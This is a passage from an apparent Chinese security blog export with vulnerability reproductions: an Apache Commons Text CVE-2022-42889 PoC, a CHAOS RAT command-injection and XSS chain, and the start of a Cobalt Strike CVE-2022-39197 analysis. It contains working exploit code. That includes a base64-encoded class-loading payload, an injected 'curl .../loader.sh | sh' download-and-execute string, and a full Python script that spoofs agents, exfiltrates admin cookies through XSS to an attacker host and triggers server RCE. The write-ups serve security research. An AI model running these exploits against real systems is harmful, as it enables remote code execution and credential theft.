main(String[] args) &#123;</span><br><span class=\"line\">        String poc &#x3D; &quot;var clazz &#x3D; java.security.SecureClassLoader.class;var method &#x3D; clazz.getSuperclass().getDeclaredMethod(&#39;defineClass&#39;, &#39;anything&#39;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);method.setAccessible(true);var classBytes &#x3D; &#39;yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHABkHABcBAApTb3VyY2VGaWxlAQAIcG9jLmphdmEMAAkACgcAGwwAHAAdAQAEY2FsYwwAHgAfAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAIAAKAQADcG9jAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAEAAQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAMAAAAGgAGAAAAAgAEAAQADQAHABAABQARAAYAFQAIAA0AAAAQAAL&#x2F;ABAAAQcADgABBwAPBAABABAAAAACABE&#x3D;&#39;;var bytes &#x3D; java.util.Base64.getDecoder().decode(classBytes);var constructor &#x3D; clazz.getDeclaredConstructor();constructor.setAccessible(true);var clz &#x3D; method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);clz.newInstance();&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">        StringSubstitutor interpolator &#x3D; StringSubstitutor.createInterpolator();</span><br><span class=\"line\">        String text &#x3D; interpolator.replace(&quot;$&#123;script:nashorn:&quot;+poc+&quot;&#125;&quot;);</span><br><span class=\"line\">        System.out.println(text);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"bypass关键字\"><a href=\"#bypass关键字\" class=\"headerlink\" title=\"bypass关键字\"></a>bypass关键字</h1><p>如果过滤了script,url,file等关键字，可以利用base64Decoder进行绕过，</p>\n<p>原理就是在调用完一次解析替换后，会对产生的新值再一次进行解析，判断是否含有 <code>$&#123;</code> 与 <code>&#125;</code>，如果有就递归再次解析</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;base64Decoder:JHtzY3JpcHQ6anM6amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNhbGMiKX0&#x3D;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om\">CVE-2022-42889: Apache Commons Text prior to 1.10.0 allows RCE when applied to untrusted input due to insecure interpolation defaults-Apache Mail Archives</a></p>\n<p><a href=\"https://commons.apache.org/proper/commons-text/userguide.html\">Commons Text – Commons Text - User guide (apache.org)</a></p>\n","categories":["JavaCVES"]},{"title":"CHAOS-RAT-RCE","url":"/2024/04/11/CHAOS-RAT-RCE/","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>CHAOS RAT是由Golang开发的一款带有web面板的开源c2，主要用来挖矿，简单复现分析一下该RAT存在的rce漏洞</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411214402436.png\" alt=\"image-20240411214402436\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>项目地址：<a href=\"https://github.com/tiagorlampert/CHAOS\">https://github.com/tiagorlampert/CHAOS</a></p>\n<p>解压，docker运行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Create a shared directory between the host and container</span><br><span class=\"line\">$ mkdir ~&#x2F;chaos-container</span><br><span class=\"line\"></span><br><span class=\"line\">$ docker run -it -v ~&#x2F;chaos-container:&#x2F;database&#x2F; -v ~&#x2F;chaos-container:&#x2F;temp&#x2F; \\</span><br><span class=\"line\">  -e PORT&#x3D;8080 -e SQLITE_DATABASE&#x3D;chaos -p 8080:8080 tiagorlampert&#x2F;chaos:latest</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411155522973.png\" alt=\"image-20240411155522973\"></p>\n<h1 id=\"代码分析\"><a href=\"#代码分析\" class=\"headerlink\" title=\"代码分析\"></a>代码分析</h1><h2 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h2><p>首先在BuildClient 函数找到了一处命令注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) &#123;</span><br><span class=\"line\">\tif !isValidIPAddress(input.ServerAddress) &amp;&amp; !isValidURL(input.ServerAddress) &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, internal.ErrInvalidServerAddress</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif !isValidPort(input.ServerPort) &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, internal.ErrInvalidServerPort</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfilename, err :&#x3D; utils.NormalizeString(input.Filename)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tnewToken, err :&#x3D; c.GenerateNewToken()</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tconst buildStr &#x3D; &#96;GO_ENABLED&#x3D;1 GOOS&#x3D;%s GOARCH&#x3D;amd64 go build -ldflags &#39;%s -s -w -X main.Version&#x3D;%s -X main.Port&#x3D;%s -X main.ServerAddress&#x3D;%s -X main.Token&#x3D;%s -extldflags &quot;-static&quot;&#39; -o ..&#x2F;temp&#x2F;%s main.go&#96;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfilename &#x3D; buildFilename(input.OSTarget, filename)</span><br><span class=\"line\">\tbuildCmd :&#x3D; fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, newToken, filename)</span><br><span class=\"line\"></span><br><span class=\"line\">\tcmd :&#x3D; exec.Command(&quot;sh&quot;, &quot;-c&quot;, buildCmd)</span><br><span class=\"line\">\tcmd.Dir &#x3D; &quot;client&#x2F;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">\toutputErr, err :&#x3D; cmd.CombinedOutput()</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, fmt.Errorf(&quot;%w:%s&quot;, err, outputErr)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn filename, nil</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>本地验证命令注入，通过反引号成功实现命令注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411163237194.png\" alt=\"image-20240411163237194\"></p>\n<p>该函数在 generateBinaryPostHandler 中被调用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">func (h *httpController) generateBinaryPostHandler(c *gin.Context) &#123;</span><br><span class=\"line\">\tvar req request.GenerateClientRequestForm</span><br><span class=\"line\">\tif err :&#x3D; c.ShouldBindWith(&amp;req, binding.Form); err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\tc.String(http.StatusBadRequest, err.Error())</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tosTarget, err :&#x3D; strconv.Atoi(req.OSTarget)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\tc.String(http.StatusBadRequest, err.Error())</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tbinary, err :&#x3D; h.ClientService.BuildClient(client.BuildClientBinaryInput&#123;</span><br><span class=\"line\">\t\tServerAddress: req.Address,</span><br><span class=\"line\">\t\tServerPort:    req.Port,</span><br><span class=\"line\">\t\tOSTarget:      system.OSTargetIntMap[osTarget],</span><br><span class=\"line\">\t\tFilename:      req.Filename,</span><br><span class=\"line\">\t\tRunHidden:     utils.ParseCheckboxBoolean(req.RunHidden),</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\th.Logger.Error(err)</span><br><span class=\"line\">\t\tc.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tc.String(http.StatusOK, binary)</span><br><span class=\"line\">\treturn</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而该handler对应的后台路由为 /generate</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">adminGroup.POST(&quot;&#x2F;generate&quot;, handler.generateBinaryPostHandler)</span><br></pre></td></tr></table></figure>\n\n<p>通过访问该路由，推测该函数用于生成client被控端，输入的参数例如RunHidden、ServerAddress、ServerPort等</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411162315891.png\" alt=\"image-20240411162315891\"></p>\n<p>抓包查看所需参数，只有 address、port、os_target、filename、run_hidden五个参数可控</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST &#x2F;generate HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 192.168.76.128:8080</span><br><span class=\"line\">Cookie: XDEBUG_SESSION&#x3D;PHPSTORM; jwt&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRob3JpemVkIjp0cnVlLCJleHAiOjE3MTI4MzAxODgsIm9yaWdfaWF0IjoxNzEyODI2NTg4LCJ1c2VyIjoiYWRtaW4ifQ.qaYqzrnAypBZ5dVkRk5LR4GX3U_10dnZxVK6IAwXyfc</span><br><span class=\"line\">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class=\"line\">Referer: http:&#x2F;&#x2F;192.168.76.128:8080&#x2F;generate</span><br><span class=\"line\">Origin: http:&#x2F;&#x2F;192.168.76.128:8080</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;123.0.0.0 Safari&#x2F;537.36</span><br><span class=\"line\">Accept: *&#x2F;*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class=\"line\">Content-Length: 537</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;address&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">172.17.0.2</span><br><span class=\"line\">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;port&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">8080</span><br><span class=\"line\">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;os_target&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">1</span><br><span class=\"line\">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;filename&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;run_hidden&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">false</span><br><span class=\"line\">------WebKitFormBoundary8RrfJ8oE1HE3x45z--</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>但是每个参数都有一定的检查，经过审计后，只有address存在利用可能</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">if !isValidIPAddress(input.ServerAddress) &amp;&amp; !isValidURL(input.ServerAddress) &#123;</span><br><span class=\"line\">\treturn &quot;&quot;, internal.ErrInvalidServerAddress</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if !isValidPort(input.ServerPort) &#123;</span><br><span class=\"line\">    return &quot;&quot;, internal.ErrInvalidServerPort</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">filename, err :&#x3D; utils.NormalizeString(input.Filename)</span><br><span class=\"line\">if err !&#x3D; nil &#123;</span><br><span class=\"line\">    return &quot;&quot;, err</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>针对isValidURL的绕过依旧利用反引号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;example.com&#x2F;&#39;&#96;touch &#x2F;tmp&#x2F;pwn&#96;&#39;</span><br><span class=\"line\">or</span><br><span class=\"line\">http:&#x2F;&#x2F;example.com&#39;$(IFS&#x3D;];b&#x3D;curl]192.168.1.6:80&#x2F;loader.sh;$b|sh)&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411174432127.png\" alt=\"image-20240411174432127\"></p>\n<h2 id=\"agent分析\"><a href=\"#agent分析\" class=\"headerlink\" title=\"agent分析\"></a>agent分析</h2><p>生成的agent，主要有三个信息，serveraddress，serverport，token。前两个不用说，token用于agent的身份认证，这些信息都以string形式存放在agent的编译信息中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411180504245.png\" alt=\"image-20240411180504245\"></p>\n<p>上线流程为：</p>\n<ol>\n<li>以http携带jwt为cookie字段，不断访问server的 /health 用于检测是否可达 和 /device 用于发送agent主机信息，server端将收到的信息保存，访问 /devices 用于查看所有的上线agent</li>\n<li>以websocket与server的 /client 建立连接，等待指令</li>\n</ol>\n<p>结合以上信息，通过提取agent的三个信息，可以伪造agent上线，并且可以控制向server的信息回传</p>\n<h2 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h2><p>能造成xss的无非两个地方，主机信息 与 命令回传</p>\n<p>在命令回传处，直接输出，造成xss</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411191257276.png\" alt=\"image-20240411191257276\"></p>\n<p>伪造上线</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411191154093.png\" alt=\"image-20240411191154093\"></p>\n<p>输入命令，xss</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411191401017.png\" alt=\"image-20240411191401017\"></p>\n<h2 id=\"漏洞组合\"><a href=\"#漏洞组合\" class=\"headerlink\" title=\"漏洞组合\"></a>漏洞组合</h2><p>伪造上线-&gt;xss-&gt;csrf-&gt;server端rce  或 伪造上线-&gt;xss-&gt;cookie登录-&gt;server端rce</p>\n<h1 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import threading</span><br><span class=\"line\">import json</span><br><span class=\"line\">import websocket</span><br><span class=\"line\">import argparse</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">from functools import partial</span><br><span class=\"line\">from http.server import BaseHTTPRequestHandler, HTTPServer</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Collector(BaseHTTPRequestHandler):</span><br><span class=\"line\">    def __init__(self, ip, port, target, *args, **kwargs):</span><br><span class=\"line\">        self.ip &#x3D; ip</span><br><span class=\"line\">        self.port &#x3D; port</span><br><span class=\"line\">        self.target &#x3D; target</span><br><span class=\"line\">        super().__init__(*args, **kwargs)</span><br><span class=\"line\"></span><br><span class=\"line\">    def do_GET(self):</span><br><span class=\"line\">        print(self.path)</span><br><span class=\"line\">        cookie &#x3D; self.path.split(&quot;&#x3D;&quot;)[1]</span><br><span class=\"line\">        self.send_response(200)</span><br><span class=\"line\">        self.end_headers()</span><br><span class=\"line\">        self.wfile.write(b&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">        print(f&quot;[+]Exploiting &#123;self.target&#125; with JWT &#123;cookie&#125;&quot;)</span><br><span class=\"line\">        headers &#x3D; &#123;</span><br><span class=\"line\">            &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;115.0&#39;,</span><br><span class=\"line\">            &#39;Content-Type&#39;: &#39;multipart&#x2F;form-data; boundary&#x3D;---------------------------196428912119225031262745068932&#39;,</span><br><span class=\"line\">            &#39;Cookie&#39;: f&#39;jwt&#x3D;&#123;cookie&#125;&#39;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        requests.post(url&#x3D;f&quot;http:&#x2F;&#x2F;&#123;self.target&#125;&#x2F;generate&quot;,data&#x3D;f&#39;-----------------------------196428912119225031262745068932\\r\\nContent-Disposition: form-data; name&#x3D;&quot;address&quot;\\r\\n\\r\\nhttp:&#x2F;&#x2F;example.com&#x2F;\\&#39;&#96;touch &#x2F;tmp&#x2F;pwn&#96;\\&#39;\\r\\n-----------------------------196428912119225031262745068932\\r\\nContent-Disposition: form-data; name&#x3D;&quot;port&quot;\\r\\n\\r\\n8080\\r\\n-----------------------------196428912119225031262745068932\\r\\nContent-Disposition: form-data; name&#x3D;&quot;os_target&quot;\\r\\n\\r\\n1\\r\\n-----------------------------196428912119225031262745068932\\r\\nContent-Disposition: form-data; name&#x3D;&quot;filename&quot;\\r\\n\\r\\n\\r\\n-----------------------------196428912119225031262745068932\\r\\nContent-Disposition: form-data; name&#x3D;&quot;run_hidden&quot;\\r\\n\\r\\nfalse\\r\\n-----------------------------196428912119225031262745068932--\\r\\n&#39;,headers&#x3D;headers,verify&#x3D;False)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def convert_to_int_array(string):</span><br><span class=\"line\">    int_array &#x3D; []</span><br><span class=\"line\">    for char in string:</span><br><span class=\"line\">        int_array.append(ord(char))</span><br><span class=\"line\">    return int_array</span><br><span class=\"line\"></span><br><span class=\"line\">def extract_client_info(path):</span><br><span class=\"line\">    with open(path, &#39;rb&#39;) as f:</span><br><span class=\"line\">        data &#x3D; str(f.read())</span><br><span class=\"line\"></span><br><span class=\"line\">    address_regexp &#x3D; r&quot;main\\.ServerAddress&#x3D;(?:[0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span><br><span class=\"line\">    address_pattern &#x3D; re.compile(address_regexp)</span><br><span class=\"line\">    address &#x3D; address_pattern.findall(data)[0].split(&quot;&#x3D;&quot;)[1]</span><br><span class=\"line\"></span><br><span class=\"line\">    port_regexp &#x3D; r&quot;main\\.Port&#x3D;\\d&#123;1,6&#125;&quot;</span><br><span class=\"line\">    port_pattern &#x3D; re.compile(port_regexp)</span><br><span class=\"line\">    port &#x3D; port_pattern.findall(data)[0].split(&quot;&#x3D;&quot;)[1]</span><br><span class=\"line\"></span><br><span class=\"line\">    jwt_regexp &#x3D; r&quot;main\\.Token&#x3D;[a-zA-Z0-9_\\.\\-+&#x2F;&#x3D;]*\\.[a-zA-Z0-9_\\.\\-+&#x2F;&#x3D;]*\\.[a-zA-Z0-9_\\.\\-+&#x2F;&#x3D;]*&quot;</span><br><span class=\"line\">    jwt_pattern &#x3D; re.compile(jwt_regexp)</span><br><span class=\"line\">    jwt &#x3D; jwt_pattern.findall(data)[0].split(&quot;&#x3D;&quot;)[1]</span><br><span class=\"line\"></span><br><span class=\"line\">    return f&quot;&#123;address&#125;:&#123;port&#125;&quot;, jwt</span><br><span class=\"line\"></span><br><span class=\"line\">def keep_connection(target, cookie, hostname, username, os_name, mac, ip):</span><br><span class=\"line\">    headers &#x3D; &#123;</span><br><span class=\"line\">            &quot;Cookie&quot;: f&quot;jwt&#x3D;&#123;cookie&#125;&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        data &#x3D; &#123;&quot;hostname&quot;: hostname, &quot;username&quot;:username,&quot;user_id&quot;: username,&quot;os_name&quot;: os_name, &quot;os_arch&quot;:&quot;amd64&quot;, &quot;mac_address&quot;: mac, &quot;local_ip_address&quot;: ip, &quot;port&quot;:&quot;8000&quot;, &quot;fetched_unix&quot;:int(time.time())&#125;</span><br><span class=\"line\">        requests.get(f&quot;http:&#x2F;&#x2F;&#123;target&#125;&#x2F;health&quot;, headers&#x3D;headers)</span><br><span class=\"line\">        requests.post(f&quot;http:&#x2F;&#x2F;&#123;target&#125;&#x2F;device&quot;, headers&#x3D;headers, json&#x3D;data)</span><br><span class=\"line\">        time.sleep(30)</span><br><span class=\"line\"></span><br><span class=\"line\">def handle_command(target, cookie, mac, ip, port):</span><br><span class=\"line\">    headers &#x3D; &#123;</span><br><span class=\"line\">        &quot;Cookie&quot;: f&quot;jwt&#x3D;&#123;cookie&#125;&quot;,</span><br><span class=\"line\">        &quot;X-Client&quot;: mac</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ws &#x3D; websocket.WebSocket()</span><br><span class=\"line\">    ws.connect(f&#39;ws:&#x2F;&#x2F;&#123;target&#125;&#x2F;client&#39;, header&#x3D;headers)</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        ws.recv()</span><br><span class=\"line\">        data &#x3D; &#123;&quot;client_id&quot;: mac, &quot;response&quot;: convert_to_int_array(f&quot;&lt;script&gt;var i &#x3D; new Image;i.src&#x3D;&#39;http:&#x2F;&#x2F;&#123;ip&#125;:&#123;port&#125;&#x2F;&#39;+document.cookie;&lt;&#x2F;script&gt;&quot;), &quot;has_error&quot;: False&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        ws.send_binary(json.dumps(data))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def run(ip, port, target):</span><br><span class=\"line\">    server_address &#x3D; (ip, int(port))</span><br><span class=\"line\"></span><br><span class=\"line\">    collector &#x3D; partial(Collector, ip, port, target)</span><br><span class=\"line\">    httpd &#x3D; HTTPServer(server_address, collector)</span><br><span class=\"line\">    print(f&#39;Server running on port &#123;ip&#125;:&#123;port&#125;&#39;)</span><br><span class=\"line\">    httpd.serve_forever()</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class=\"line\">    parser &#x3D; argparse.ArgumentParser()</span><br><span class=\"line\">    subparsers &#x3D; parser.add_subparsers(dest&#x3D;&quot;option&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    exploit &#x3D; subparsers.add_parser(&quot;exploit&quot;)</span><br><span class=\"line\">    exploit.add_argument(&quot;-f&quot;, &quot;--file&quot;,  help&#x3D;&quot;The path to the CHAOS client&quot;)</span><br><span class=\"line\">    exploit.add_argument(&quot;-l&quot;, &quot;--local_ip&quot;, help&#x3D;&quot;The local IP to use for serving bash script and mp4&quot;, required&#x3D;True)</span><br><span class=\"line\">    args &#x3D; parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    if args.option &#x3D;&#x3D; &quot;exploit&quot;:</span><br><span class=\"line\">        target, jwt &#x3D; extract_client_info(args.file)</span><br><span class=\"line\"></span><br><span class=\"line\">        bg &#x3D; threading.Thread(target&#x3D;keep_connection, args&#x3D;(target, jwt, &quot;DC01&quot;, &quot;Administrator&quot;, &quot;Windows&quot;, &quot;3f:72:58:91:56:56&quot;, &quot;10.0.17.12&quot;))</span><br><span class=\"line\">        bg.start()</span><br><span class=\"line\"></span><br><span class=\"line\">        cmd &#x3D; threading.Thread(target&#x3D;handle_command, args&#x3D;(target, jwt, &quot;3f:72:58:91:56:56&quot;, args.local_ip, 8000))</span><br><span class=\"line\">        cmd.start()</span><br><span class=\"line\"></span><br><span class=\"line\">        server &#x3D; threading.Thread(target&#x3D;run, args&#x3D;(args.local_ip, 8000, target))</span><br><span class=\"line\">        server.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\">        parser.print_help(sys.stderr)</span><br><span class=\"line\">        sys.exit(1)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411211951923.png\" alt=\"image-20240411211951923\"></p>\n<p><strong>Reference：</strong><a href=\"https://blog.chebuya.com/posts/remote-code-execution-on-chaos-rat-via-spoofed-agents/\">Remote code execution (CVE-2024-30850) on CHAOS RAT v5.01 web panel via spoofed agent callbacks (CVE-2024-31839) </a></p>\n","categories":["代码审计"]},{"title":"CVE-2022-39197","url":"/2023/12/25/CVE-2022-39197/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019195602069.png\" alt=\"image-20221019195602069\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>漂亮鼠的文章思路也懂，就是头铁硬看了JDK，没有看CS里的具体类。今天再次分析。</p>\n<p>在java的swing中可加载html标签，<a href=\"https://docs.oracle.com/javase/tutorial/uiswing/components/html.html%EF%BC%8C%E7%B1%BB%E4%BC%BC%E8%BF%99%E7%A7%8D%E6%95%88%E6%9E%9C\">https://docs.oracle.com/javase/tutorial/uiswing/components/html.html，类似这种效果</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221018204036846.png\" alt=\"image-20221018204036846\"></p>\n<p>其中有一个object的标签，会实例化ObjectView类型对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221018203551343.png\" alt=\"image-20221018203551343\"></p>\n<p>大概就是通过classid去实例化一个符合一定条件的对象,并且通过param中的name与value进行参数的传递</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221018204153583.png\" alt=\"image-20221018204153583\"></p>\n<p>下面代码就是反射然后实例化一个类对象，setParameters进行参数的赋值并调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221018204517449.png\" alt=\"image-20221018204517449\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221018204810300.png\" alt=\"image-20221018204810300\"></p>\n<p>提取我们要找符合这些条件的：</p>\n<ul>\n<li>classid传入需要实例化的类，类必须继承与Component</li>\n<li>必须有无参构造方法，因为newInstance是调用的无参构造方法</li>\n<li>必须存在一个setXXX方法的XXX属性</li>\n<li>setXXX方法的传参数必须是接受一个string类型的参数</li>\n</ul>\n<p>光在JDK中就有300多个实现，我要是会codeql就好了(qaq)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221018210145849.png\" alt=\"image-20221018210145849\"></p>\n<p>利用正则 <code>public void set.*\\(String .*\\)</code> 撸了两遍发现基本都是什么setText、setName等，根本没有什么危险的地方。</p>\n<h1 id=\"CS的分析\"><a href=\"#CS的分析\" class=\"headerlink\" title=\"CS的分析\"></a>CS的分析</h1><p>jdk看完了，放置了两天等网上的分析文章。当时竟然没有想到分析分析cs的jar包看看…将cs的jar包添加为库，重新寻找一遍，132个并不多。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221018210719894.png\" alt=\"image-20221018210719894\"></p>\n<p>暂且找到一个 <strong>JSVGCanvas#setURI()</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019091139491.png\" alt=\"image-20221019091139491\"></p>\n<p>通过搜索发现使用的是batik组件：<a href=\"https://xmlgraphics.apache.org/batik/\">Batik SVG Toolkit </a></p>\n<blockquote>\n<p><strong>Batik</strong>是Batik SVG Toolkit或Batik Java SVG Toolkit的简称，一个基于Java的应用程序或小应用的工具集，意图将SVG格式用于多种目的，如查看，主控或操纵。该项目的目标是让开发一套核心模块，以及实现高度可扩展性</p>\n</blockquote>\n<p>setURI通过给定的url调用 loadSVGDocument() 加载远程SVG文档</p>\n<p><img 